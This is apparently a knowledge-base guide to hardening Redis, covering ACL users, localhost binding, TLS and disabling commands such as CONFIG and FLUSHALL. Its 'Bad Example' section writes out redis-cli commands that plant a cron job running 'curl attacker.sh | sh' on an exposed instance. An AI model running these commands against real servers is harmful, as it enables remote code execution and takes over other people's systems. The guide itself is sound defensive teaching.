---
id: redis/21-security
topic: redis
slug: security
title: "Redis Security"
type: doc
order: 21
status: ready
tags: [redis, security]
related: [redis/01-installation, redis/11-lua-scripting, redis/22-monitoring, redis/27-production]
when_to_use: "Read before exposing Redis on any network, configuring auth, or reviewing a Redis deployment for hardening."
---
# Redis Security

## Purpose

This document defines how to lock down a Redis deployment: authentication and ACLs,
network exposure, TLS, and disabling dangerous commands. Redis is fast partly
because it does almost nothing to protect itself by default — hardening is entirely
on the operator. The goal is that an agent can deploy or review Redis without
leaving it open to the internet or to unbounded blast-radius commands.

Security here means "who can reach this instance and what can they do once
connected?". Getting either wrong exposes or destroys the whole dataset at once.

## Why It Matters

An unauthenticated Redis bound to a public interface is one of the most
reliably-exploited misconfigurations on the internet — bots scan for it, dump the
keyspace, and use `CONFIG SET` to write cron jobs or SSH keys for remote code
execution. Because Redis has no auth by default and commands like `FLUSHALL`,
`KEYS`, `CONFIG`, and `DEBUG` are unrestricted, a single exposed port is total
compromise, not a partial one. The failure is silent until the data is already
gone or the box is already owned.

## Core Principles

- **Never expose Redis to an untrusted network.** Bind to localhost or a private
  subnet; put it behind a firewall/security group. The port must not be reachable
  from the internet.
- **Authenticate every connection.** Use ACL users with strong passwords (Redis 6+),
  not the legacy shared `requirepass` alone. No unauthenticated access.
- **Grant least privilege.** An app that only reads and writes its own keys should
  not be able to run `CONFIG`, `FLUSHALL`, `KEYS`, `DEBUG`, or `SCRIPT`.
- **Encrypt in transit when leaving the host.** Use TLS for any connection that
  crosses a network you do not fully control.
- **Assume `CONFIG SET` is RCE.** If an attacker can run it, they can rewrite the
  data path and gain code execution. Disable or restrict it for app users.

## Best Practices

- Set `bind 127.0.0.1 -::1` (or the private IP only) and keep
  **`protected-mode yes`**. Never `bind 0.0.0.0` without auth and a firewall.
- Define per-application **ACL users** with `ACL SETUSER`, scoped to the key
  patterns and command categories they need. Disable the `default` user or give it
  `nopass off` with no permissions.
- Use a long, random password stored in a secrets manager — never in code, config
  committed to git, or logs.
- Enable **TLS** (`tls-port`, `tls-cert-file`, `tls-key-file`,
  `tls-ca-cert-file`) for cross-network traffic; require client certs for
  service-to-service where possible.
- **Rename or disable dangerous commands** for app users:
  `rename-command FLUSHALL ""`, restrict `CONFIG`, `KEYS`, `DEBUG`, `SHUTDOWN`,
  `SCRIPT`, `MODULE` via ACLs or `rename-command`.
- Run Redis as a **non-root** user with a locked-down data directory, so a `CONFIG
  SET dir` cannot write to sensitive paths.
- Keep Redis patched; RCE-class CVEs (Lua sandbox escapes, module loading) get
  fixed in point releases.

## Examples

**Good Example** — least-privilege ACL user, no dangerous commands

```bash
# App user can touch only its own keyspace and a safe command set.
# WHY: even if the app's credentials leak, the blast radius is this key prefix,
# not FLUSHALL / CONFIG / KEYS across the whole instance.
ACL SETUSER orders on >S3cret-from-vault \
  ~orders:* \
  +@read +@write +@string +@hash \
  -@dangerous -config -keys -flushall -flushdb -debug

ACL SETUSER default off        # kill the passwordless default user
```

```conf
# redis.conf
bind 127.0.0.1 -::1
protected-mode yes
requirepass ""                 # rely on ACL users, not a shared password
```

**Bad Example** — exposed, unauthenticated, fully privileged

```conf
# redis.conf
bind 0.0.0.0                   # reachable from anywhere
protected-mode no              # no guard rail
# no requirepass, no ACLs      # every connection is the all-powerful default user
```

```bash
# Anyone who finds the port can do this:
redis-cli -h victim CONFIG SET dir /var/spool/cron/
redis-cli -h victim CONFIG SET dbfilename root
redis-cli -h victim SET x "* * * * * curl attacker.sh | sh"
redis-cli -h victim SAVE       # -> arbitrary code execution via cron
```

## Common Mistakes

- Binding to `0.0.0.0` (or a public IP) with `protected-mode no` and no auth.
- Relying on a single shared `requirepass` for every service instead of scoped ACL
  users, so one leak exposes everything.
- Giving the application user `@dangerous`, `CONFIG`, `KEYS`, or `FLUSHALL`.
- Hardcoding the Redis password in source or config committed to version control.
- Running Redis as root, so `CONFIG SET dir` can write anywhere on the box.
- Sending traffic across a network in plaintext, exposing keys and credentials.
- Assuming a private subnet is safe and skipping auth entirely — defense in depth
  means both.

## Production Tips

- Audit access with the ACL log: `ACL LOG` shows denied commands and auth failures;
  alert on spikes.
- Rotate ACL passwords from the secrets manager on a schedule and on any suspected
  leak.
- Scan your own exposed ports from outside the VPC to confirm Redis is not reachable.
- Keep `CLIENT NO-EVICT`/`CLIENT NO-TOUCH` and admin commands off the app user's
  ACL; separate an ops user for maintenance.

## AI Review Checklist

- Is Redis bound to localhost/private IP with `protected-mode yes`, never
  `0.0.0.0` on a public interface?
- Does every connection authenticate via a scoped ACL user (not just a shared
  password)?
- Is the app user denied `@dangerous`, `CONFIG`, `KEYS`, `FLUSHALL`, `DEBUG`,
  `SCRIPT`?
- Is TLS used for any cross-network traffic?
- Are credentials pulled from a secrets manager, never committed or logged?
- Does Redis run as non-root with a restricted data directory?

## Related

- `knowledge/redis/01-installation.md`
- `knowledge/redis/11-lua-scripting.md`
- `knowledge/redis/22-monitoring.md`
- `knowledge/redis/27-production.md`
